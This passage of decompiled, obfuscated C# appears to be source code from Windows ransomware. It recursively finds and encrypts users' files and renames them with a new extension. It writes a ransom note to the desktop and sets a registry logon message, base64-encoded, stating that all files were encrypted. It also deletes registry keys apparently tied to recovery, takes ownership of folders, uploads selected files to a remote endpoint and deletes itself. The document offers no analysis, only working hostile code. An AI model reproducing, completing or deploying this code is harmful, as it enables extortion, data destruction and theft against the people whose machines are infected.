					if (pWNBRDgBMEak)
					{
						streamWriter2.WriteLine(getString_0(107396653));
						streamWriter2.WriteLine(IOVuiCuRiaYQ(getString_0(107407088)));
						streamWriter2.WriteLine(FZYQuTJPlcz.bHHLhQTTINyhzg());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273));
					if (!text5.Contains(IdBmCgBFDzJuS) && !jHNjZakAkEHPd)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107407026), IOVuiCuRiaYQ(getString_0(107368911)) + getString_0(107407055) + IdBmCgBFDzJuS + IOVuiCuRiaYQ(getString_0(107368924)));
					}
				}
			}
			catch
			{
			}
		}
		if (anjZHOfAxKdTwvsWK == getString_0(107396947))
		{
			try
			{
				if (wWAWZjvXYQSD == getString_0(107396257))
				{
					FZYQuTJPlcz.ZmzAAHXmpJvah(getString_0(107368850), getString_0(107368877), getString_0(107368864), string.Concat(IOVuiCuRiaYQ(getString_0(107396687)), new WebClient().DownloadString(IOVuiCuRiaYQ(getString_0(107396662))), getString_0(107368823), IOVuiCuRiaYQ(getString_0(107396648)), DateTime.Now, getString_0(107396653), IOVuiCuRiaYQ(getString_0(107368818)), Convert.ToString(ojqyMmFKXxQzx.Count), getString_0(107396653), IOVuiCuRiaYQ(getString_0(107396607)), IdBmCgBFDzJuS));
				}
				else
				{
					FZYQuTJPlcz.ZmzAAHXmpJvah(getString_0(107368850), getString_0(107368877), getString_0(107368864), string.Concat(IOVuiCuRiaYQ(getString_0(107396687)), new WebClient().DownloadString(IOVuiCuRiaYQ(getString_0(107396662))), getString_0(107368823), IOVuiCuRiaYQ(getString_0(107396648)), DateTime.Now, getString_0(107396653), IOVuiCuRiaYQ(getString_0(107368818)), Convert.ToString(ojqyMmFKXxQzx.Count), getString_0(107396653), IOVuiCuRiaYQ(getString_0(107396607)), IdBmCgBFDzJuS));
				}
			}
			catch
			{
			}
		}
		if (giwadMcrrIYf == getString_0(107396947))
		{
			try
			{
				xCHfFBaMRYOo.LcUdaqBsTVi(new Uri(getString_0(107368289)));
			}
			catch
			{
			}
		}
		if (ALuUYkUNFV == getString_0(107396257))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273)))
				{
					Process.Start(IOVuiCuRiaYQ(getString_0(107368288)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107407026)))
				{
					Process.Start(IOVuiCuRiaYQ(getString_0(107368263)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107407026));
				}
			}
			catch
			{
			}
		}
		if (LDgIudiIYnqCR == getString_0(107396947))
		{
			if (NXYcsEtzzwISc == getString_0(107396947) && !string.IsNullOrEmpty(WjafbRcVrLBYmq) && !string.IsNullOrEmpty(ZUKimkoDnnjTL))
			{
				neWruJZXXVNZOd(WjafbRcVrLBYmq, ZUKimkoDnnjTL);
			}
			else
			{
				neWruJZXXVNZOd(getString_0(107368214), getString_0(107368185));
			}
		}
		if (IVSJCyvJyoM != getString_0(107368463))
		{
			FcYTzECrWZZa(IVSJCyvJyoM);
		}
		if (!string.IsNullOrEmpty(kRItCdOVRz))
		{
			try
			{
				File.Delete(kRItCdOVRz);
			}
			catch
			{
			}
		}
		if (fKNptYRWsQNeZX)
		{
			try
			{
				File.AppendAllText(TVaVFXxrZtbC, getString_0(107368478));
			}
			catch (Exception)
			{
			}
		}
		if (kFzbmJbQbZaZHkz == getString_0(107368433))
		{
			fFuUiPjGkyEIjnd();
		}
	}

	public static void uyjdAvZMzLU()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(IOVuiCuRiaYQ(getString_0(107368456)), IOVuiCuRiaYQ(getString_0(107367758)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int CHAbkxgtxTY(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> CucgdOdgsbzbB(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107367741)) && !text.Contains(getString_0(107367748)) && !text.Contains(getString_0(107367715)) && !text.ToLower().Contains(getString_0(107367666)) && !text.ToLower().Contains(getString_0(107367685)) && !text.Contains(getString_0(107367660)) && !text.Contains(getString_0(107367607)) && !text.ToLower().Contains(getString_0(107367622)) && !text.ToLower().Contains(getString_0(107367577)) && !text.ToLower().Contains(getString_0(107367540)) && !text.ToLower().Contains(getString_0(107367563)) && !text.ToLower().Contains(getString_0(107368026)) && !text.ToLower().Contains(getString_0(107368045)) && !text.ToLower().Contains(getString_0(107368032)) && !text.ToLower().Contains(getString_0(107368011)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107367954)) && !fileInfo.FullName.Contains(getString_0(107367969)) && !fileInfo.FullName.Contains(getString_0(107367920)) && !fileInfo.FullName.Contains(getString_0(107367935)) && !fileInfo.FullName.Contains(getString_0(107367886)) && !fileInfo.FullName.Contains(getString_0(107367869)) && !fileInfo.FullName.Contains(getString_0(107367884)) && !fileInfo.FullName.Contains(getString_0(107367835)) && !fileInfo.FullName.Contains(getString_0(107367822)) && !fileInfo.FullName.Contains(getString_0(107367801)) && !fileInfo.FullName.ToLower().Contains(getString_0(107367820)) && !fileInfo.FullName.ToLower().Contains(getString_0(107367807)) && !fileInfo.FullName.ToLower().Contains(getString_0(107367246)) && !fileInfo.FullName.ToLower().Contains(getString_0(107367229)) && !fileInfo.FullName.Contains(IOVuiCuRiaYQ(getString_0(107367244))) && !fileInfo.FullName.Contains(getString_0(107367187)) && !fileInfo.FullName.Contains(getString_0(107367206)) && !fileInfo.FullName.Contains(getString_0(107367157)) && !fileInfo.FullName.EndsWith(getString_0(107411287)) && !fileInfo.FullName.EndsWith(getString_0(107367132)) && !fileInfo.FullName.EndsWith(getString_0(107367127)) && !fileInfo.FullName.EndsWith(getString_0(107367122)) && !fileInfo.FullName.EndsWith(getString_0(107367149)) && !fileInfo.FullName.Contains(getString_0(107367144)) && !fileInfo.FullName.Contains(wKJjmTiGCFwzP) && !fileInfo.FullName.Contains(TVaVFXxrZtbC) && !fileInfo.FullName.Contains(MBSkjCFQIZSn))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(zCjFWNmzzORqwHz) * 1024.0 * 1024.0 && SGdiTvXzdcycb == getString_0(107396947))
						{
							list.Add(fileInfo.FullName);
							yiFsrzmHaMU(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && SGdiTvXzdcycb == getString_0(107396257))
						{
							list.Add(fileInfo.FullName);
							yiFsrzmHaMU(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string AbIKggCUlEtU(string CGJBaDmYSOckm = "", string FENcLYmRPcZYyN = "")
	{
		string result = getString_0(107368289);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = CGJBaDmYSOckm,
				Arguments = FENcLYmRPcZYyN,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void ACJsJWtSsMKe(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107367095),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string HoxnFARxQnHppaC(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string IOVuiCuRiaYQ(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void rGQWyTgQChsNTl(string VYsYsCljIT = "", string TNGTQvVhhjqUnEfTh = "SW5mb3JtYXRpb24uLi4=", string oKMdSodYepZTCBT = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		VYsYsCljIT = HoxnFARxQnHppaC(getString_0(107367110));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(IOVuiCuRiaYQ(VYsYsCljIT), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(IOVuiCuRiaYQ(getString_0(107367525)), IOVuiCuRiaYQ(TNGTQvVhhjqUnEfTh));
				registryKey.SetValue(IOVuiCuRiaYQ(getString_0(107367492)), IOVuiCuRiaYQ(oKMdSodYepZTCBT));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			VYsYsCljIT = HoxnFARxQnHppaC(getString_0(107367463));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(IOVuiCuRiaYQ(VYsYsCljIT), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(IOVuiCuRiaYQ(getString_0(107367358)), IOVuiCuRiaYQ(TNGTQvVhhjqUnEfTh));
				registryKey.SetValue(IOVuiCuRiaYQ(getString_0(107367293)), IOVuiCuRiaYQ(oKMdSodYepZTCBT));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void LKjYZqXbYTQ()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (NXYcsEtzzwISc == getString_0(107396947) && !string.IsNullOrEmpty(WjafbRcVrLBYmq) && !string.IsNullOrEmpty(ZUKimkoDnnjTL))
				{
					rGQWyTgQChsNTl(getString_0(107368289), WjafbRcVrLBYmq, ZUKimkoDnnjTL);
				}
				else
				{
					rGQWyTgQChsNTl(getString_0(107368289), getString_0(107368214), getString_0(107368185));
				}
			}
		}
		catch
		{
		}
	}

	public static void neWruJZXXVNZOd(string MiCFTZacqCzyJTl = "SW5mb3JtYXRpb24uLi4=", string aEGRwqzmMUXUhEddxP = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(IOVuiCuRiaYQ(MiCFTZacqCzyJTl));
		val.set_BalloonTipText(IOVuiCuRiaYQ(aEGRwqzmMUXUhEddxP));
		val.ShowBalloonTip(30000);
	}

	public static void FcYTzECrWZZa(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		AbIKggCUlEtU(getString_0(107367296), getString_0(107366739) + text + getString_0(107366762) + string_0);
	}

	public static void jcTlrrZTvkVzl(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = IOVuiCuRiaYQ(getString_0(107366757));
		processStartInfo.Arguments = getString_0(107366728) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool YWSmhZKmpyhSfY(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool ysPZqGFfywCQSxE(string string_0)
	{
		try
		{
			zZtdToLhoqZQ CS_0024_003C_003E8__locals0 = new zZtdToLhoqZQ();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.tACukTksbsM = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.tACukTksbsM);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107366723);
		}
		catch
		{
			return false;
		}
	}

	public static string yAXQiwwBLBX(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void chqfCCbfakjSFN()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = HoxnFARxQnHppaC(getString_0(107366682));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(IOVuiCuRiaYQ(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(IOVuiCuRiaYQ(getString_0(107366544)));
					registryKey.DeleteSubKey(IOVuiCuRiaYQ(getString_0(107366519)));
					registryKey.DeleteSubKey(IOVuiCuRiaYQ(getString_0(107366534)));
					registryKey.DeleteSubKey(IOVuiCuRiaYQ(getString_0(107367021)));
					registryKey.DeleteSubKey(IOVuiCuRiaYQ(getString_0(107366757)));
					registryKey.DeleteSubKey(IOVuiCuRiaYQ(getString_0(107366964)));
					registryKey.DeleteSubKey(IOVuiCuRiaYQ(getString_0(107366935)));
					registryKey.Close();
				}
				string_ = HoxnFARxQnHppaC(getString_0(107366950));
				registryKey = Registry.LocalMachine.OpenSubKey(IOVuiCuRiaYQ(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(IOVuiCuRiaYQ(getString_0(107366853)));
					registryKey.Close();
				}
				string_ = HoxnFARxQnHppaC(getString_0(107366804));
				registryKey = Registry.LocalMachine.OpenSubKey(IOVuiCuRiaYQ(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(IOVuiCuRiaYQ(getString_0(107366853)));
					registryKey.Close();
				}
				string_ = HoxnFARxQnHppaC(getString_0(107366804));
				registryKey = Registry.CurrentUser.OpenSubKey(IOVuiCuRiaYQ(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(IOVuiCuRiaYQ(getString_0(107366853)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			AbIKggCUlEtU(IOVuiCuRiaYQ(getString_0(107366819)), IOVuiCuRiaYQ(getString_0(107366770)));
			AbIKggCUlEtU(IOVuiCuRiaYQ(getString_0(107366241)), IOVuiCuRiaYQ(getString_0(107366200)));
			AbIKggCUlEtU(IOVuiCuRiaYQ(getString_0(107366241)), IOVuiCuRiaYQ(getString_0(107366086)));
			AbIKggCUlEtU(IOVuiCuRiaYQ(getString_0(107366025)), IOVuiCuRiaYQ(getString_0(107366488)));
		}
		catch
		{
		}
	}

	public static void ZBrwuJMytAla(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(IOVuiCuRiaYQ(getString_0(107366415)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void kLIjkBBOiykLsfj()
	{
		string string_ = HoxnFARxQnHppaC(getString_0(107366390));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(IOVuiCuRiaYQ(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(IOVuiCuRiaYQ(getString_0(107366341)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void fFuUiPjGkyEIjnd()
	{
		AbIKggCUlEtU(getString_0(107397197), IOVuiCuRiaYQ(getString_0(107366308)));
		string text = IOVuiCuRiaYQ(getString_0(107365602));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107365537) + text + getString_0(107365537) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397197);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void tFEmdOUcYrNKNamK(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (fKNptYRWsQNeZX)
			{
				try
				{
					File.AppendAllText(TVaVFXxrZtbC, getString_0(107365500) + string_0 + getString_0(107365491) + ex.Message + getString_0(107396653));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string EyIUaktyBiAWZ()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107368289);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107365914);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107365937))) ? getString_0(107365951) : getString_0(107365960));
				break;
			case 0:
				text = getString_0(107365942);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107365909);
				break;
			case 4:
				text = getString_0(107365928);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107365878) : getString_0(107365919));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107365891) : getString_0(107395699)) : getString_0(107365896)) : getString_0(107365873));
				break;
			case 10:
				text = getString_0(107365886);
				break;
			}
		}
		if (text != getString_0(107368289))
		{
			text = getString_0(107365849) + text;
			if (oSVersion.ServicePack != getString_0(107368289))
			{
				text = text + getString_0(107366762) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string WsSeaRlfxWeHq(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107411273);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(IOVuiCuRiaYQ(getString_0(107411240)));
				streamWriter.WriteLine(getString_0(107396653));
				streamWriter.WriteLine(IOVuiCuRiaYQ(getString_0(107407742)));
				streamWriter.WriteLine(string_0);
				if (pWNBRDgBMEak)
				{
					streamWriter.WriteLine(getString_0(107396653));
					streamWriter.WriteLine(IOVuiCuRiaYQ(getString_0(107407088)));
					streamWriter.WriteLine(FZYQuTJPlcz.bHHLhQTTINyhzg());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !jHNjZakAkEHPd)
				{
					File.AppendAllText(text, getString_0(107407055) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (fKNptYRWsQNeZX)
			{
				try
				{
					File.AppendAllText(TVaVFXxrZtbC, getString_0(107365868) + ex.Message + getString_0(107396653));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void vnuEeYRDwJUfr(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		iZGnAnBGCkDJQL.qiFqKxOEpCc CS_0024_003C_003E8__locals0 = new iZGnAnBGCkDJQL();
		CS_0024_003C_003E8__locals0.MycBHJwfxotf = string_1;
		CS_0024_003C_003E8__locals0.RKHzUavcpKfub = string_2;
		CS_0024_003C_003E8__locals0.ICdBaQxHZfqvmF = string_3;
		CS_0024_003C_003E8__locals0.fMCdyrdLmMsL = string_4;
		IWnUVTiJnjexACCr = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.ICdBaQxHZfqvmF);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395894))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !FoHxVrzKsk.Contains(array[i].Name))
					{
						FoHxVrzKsk.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!FoHxVrzKsk.Contains(string_0[j]))
				{
					FoHxVrzKsk.Add(string_0[j]);
				}
			}
		}
		if (FoHxVrzKsk.Contains(IOVuiCuRiaYQ(getString_0(107365779))) && PxbeNSeofeL == getString_0(107396947))
		{
			FoHxVrzKsk.Remove(IOVuiCuRiaYQ(getString_0(107365779)));
		}
		Parallel.ForEach(FoHxVrzKsk, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new iZGnAnBGCkDJQL.qiFqKxOEpCc();
			CS_0024_003C_003E8__locals0.HhEoXagSPtnRdMUw = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.TKSiYfiNXnMwSEx = string_0;
			if (eRHwMzVAUfqqx && !EyIUaktyBiAWZ().Contains(iZGnAnBGCkDJQL.getString_0(107365888)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						YWSmhZKmpyhSfY(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.TKSiYfiNXnMwSEx);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (wWAWZjvXYQSD == iZGnAnBGCkDJQL.getString_0(107396957))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					VGpCoFaKxrpD(CS_0024_003C_003E8__locals0.TKSiYfiNXnMwSEx, CS_0024_003C_003E8__locals0.HhEoXagSPtnRdMUw.MycBHJwfxotf, CS_0024_003C_003E8__locals0.HhEoXagSPtnRdMUw.fMCdyrdLmMsL, CS_0024_003C_003E8__locals0.HhEoXagSPtnRdMUw.RKHzUavcpKfub, CS_0024_003C_003E8__locals0.HhEoXagSPtnRdMUw.ICdBaQxHZfqvmF);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				VGpCoFaKxrpD(CS_0024_003C_003E8__locals0.TKSiYfiNXnMwSEx, CS_0024_003C_003E8__locals0.MycBHJwfxotf, CS_0024_003C_003E8__locals0.fMCdyrdLmMsL, CS_0024_003C_003E8__locals0.RKHzUavcpKfub, CS_0024_003C_003E8__locals0.ICdBaQxHZfqvmF);
			}
		});
	}

	public static void VGpCoFaKxrpD(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107368289));
		List<string> list3 = list2;
		if (MOygNsolRhkJe == getString_0(107396257))
		{
			if (WcZSwKmwveRmr == getString_0(107396947) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ysPZqGFfywCQSxE(string_0))
			{
				NEaQPkrjwyf nEaQPkrjwyf = null;
				try
				{
					nEaQPkrjwyf = new NEaQPkrjwyf(string_0.Replace(getString_0(107396869), getString_0(107368289)));
				}
				catch
				{
					list = CucgdOdgsbzbB(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					yiFsrzmHaMU(nEaQPkrjwyf.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = CucgdOdgsbzbB(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = CucgdOdgsbzbB(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = sEtcRWviDZdSUvW.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0457;
					}
				}
				if ((dwDJlZMjFatuJC == getString_0(107396257) && !item.EndsWith(text)) || ojqyMmFKXxQzx.Contains(item))
				{
					continue;
				}
				if (REuQhDHRFMt == getString_0(107396947))
				{
					try
					{
						if (sdnUYDgvtpPnO.KcNiwSfGbe(item))
						{
							sdnUYDgvtpPnO.nVpvygjXPyvs(item);
						}
					}
					catch
					{
					}
				}
				ojqyMmFKXxQzx.Add(item);
				if (!JGpmykxMfw.Contains(Path.GetDirectoryName(item)))
				{
					JGpmykxMfw.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (KfMEqDPrRPT == getString_0(107396947) && fileStream.Length > Convert.ToInt32(VwOPUhcZlsvZmR) * 1024 * 1024 && !list3.Contains(text))
					{
						if (UyFfCzWWLzNEG == getString_0(107396947))
						{
							foreach (string item2 in PlfqlzQrkBHY)
							{
								if (item.ToLower().EndsWith(item2) && rLaVjFwRdfLdr == getString_0(107396947))
								{
									if (Convert.ToInt32(KOFrqFvMUqLVa) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											FZYQuTJPlcz.FdLmtwIxPaLAh(getString_0(107368850), getString_0(107368877), getString_0(107368864), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && rLaVjFwRdfLdr == getString_0(107396257))
								{
									try
									{
										FZYQuTJPlcz.FdLmtwIxPaLAh(getString_0(107368850), getString_0(107368877), getString_0(107368864), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = GWOsLqMwIb.WvcDKTbtliDrPF(item, Convert.ToInt32(VwOPUhcZlsvZmR) * 1024 * 1024);
						byte[] pwpxQaHWCtbm = GWOsLqMwIb.buNDQCFBoGJ(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						GWOsLqMwIb.isjSvDiECOPp(item, pwpxQaHWCtbm);
						if (string_2 != getString_0(107365802))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107365802))
					{
						bYMHvDzMdQUn(item, item + string_2, IWnUVTiJnjexACCr);
					}
					else
					{
						bYMHvDzMdQUn(item, item + getString_0(107365797), IWnUVTiJnjexACCr);
					}
				}
				catch (Exception)
				{
				}
				IL_0457:;
			}
		}
	}

	public static void yiFsrzmHaMU(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		TajjcMGKxy.UjdWIsKCvIWmr CS_0024_003C_003E8__locals0 = new TajjcMGKxy();
		CS_0024_003C_003E8__locals0.sqQpQQcELGqIJWzCd = list_0;
		CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO = string_1;
		CS_0024_003C_003E8__locals0.xZtVzlbLhvULOy = string_2;
		CS_0024_003C_003E8__locals0.UMxsSKxdLwMPg = string_3;
		CS_0024_003C_003E8__locals0.CSkUagcVHnsgV = new List<string> { getString_0(107368289) };
		if (dwDJlZMjFatuJC == getString_0(107396257))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				using List<string>.Enumerator enumerator2 = CS_0024_003C_003E8__locals0.sqQpQQcELGqIJWzCd.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					TajjcMGKxy.BtfkVxbqHeqSpB CS_0024_003C_003E8__locals1 = new TajjcMGKxy.BtfkVxbqHeqSpB();
					CS_0024_003C_003E8__locals1.qFRqtpZnzrSL = CS_0024_003C_003E8__locals0;
					CS_0024_003C_003E8__locals1.ypXuEqFvQXPYZ = enumerator2.Current;
